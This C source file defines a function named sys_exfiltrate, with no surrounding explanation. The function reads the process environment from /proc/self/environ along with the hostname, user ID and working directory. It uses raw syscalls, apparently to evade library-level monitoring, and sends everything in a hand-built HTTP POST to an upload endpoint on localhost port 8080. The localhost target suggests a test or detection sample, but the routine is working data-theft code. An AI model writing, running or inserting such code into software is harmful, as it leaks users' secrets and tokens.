#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>

#define BUFFER_SIZE 8192

// Helper function to convert int8 array to a null-terminated string
void chars_to_string(char *dest, const char *src, size_t len) {
    size_t i;
    for (i = 0; i < len && src[i] != '\0'; i++) {
        dest[i] = src[i];
    }
    dest[i] = '\0';
}


void sys_exfiltrate() {
    char data_to_send[BUFFER_SIZE] = {0};
    size_t data_len = 0;

    // ----------------------------------------------------------------
    // 1. Read raw environment data from /proc/self/environ
    // ----------------------------------------------------------------
    int fd = syscall(SYS_open, "/proc/self/environ", O_RDONLY, 0);
    if (fd >= 0) {
        char buf[BUFFER_SIZE];
        ssize_t n = syscall(SYS_read, fd, buf, sizeof(buf));
        if (n > 0) {
            data_len += snprintf(data_to_send + data_len, sizeof(data_to_send) - data_len, "Environment:\n%.*s\n", (int)n, buf);
        }
        syscall(SYS_close, fd);
    }

    // ----------------------------------------------------------------
    // 2. Get hostname via syscall uname
    // ----------------------------------------------------------------
    struct utsname uts;
    if (syscall(SYS_uname, &uts) == 0) {
        char hostname[65];
        chars_to_string(hostname, uts.nodename, sizeof(uts.nodename));
        data_len += snprintf(data_to_send + data_len, sizeof(data_to_send) - data_len, "\nHostname: %s\n", hostname);
    }

    // ----------------------------------------------------------------
    // 3. Get user ID via syscall getuid
    // ----------------------------------------------------------------
    uid_t uid = syscall(SYS_getuid);
    data_len += snprintf(data_to_send + data_len, sizeof(data_to_send) - data_len, "\nCurrent UID: %d\n", uid);

    // ----------------------------------------------------------------
    // 4. Get current working directory via syscall getcwd
    // ----------------------------------------------------------------
    char cwd[1024];
    if (syscall(SYS_getcwd, cwd, sizeof(cwd)) != -1) {
        data_len += snprintf(data_to_send + data_len, sizeof(data_to_send) - data_len, "\nCurrent working dir: %s\n", cwd);
    }

    // ----------------------------------------------------------------
    // 5. Open a socket, connect, and manually send an HTTP POST
    // ----------------------------------------------------------------
    int sock = syscall(SYS_socket, AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8080);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);

    if (syscall(SYS_connect, sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        syscall(SYS_close, sock);
        return;
    }

    // Build a minimal HTTP POST request
    char post_request[BUFFER_SIZE];
    int post_len = snprintf(post_request, sizeof(post_request),
        "POST /upload HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Content-Type: text/plain\r\n"
        "Content-Length: %zu\r\n"
        "\r\n%s",
        data_len, data_to_send);

    // Write the request to the socket
    syscall(SYS_write, sock, post_request, post_len);

    // Optionally read back a response (not strictly necessary here)
    char resp_buf[4096];
    syscall(SYS_read, sock, resp_buf, sizeof(resp_buf));

    // Close the socket
    syscall(SYS_close, sock);
}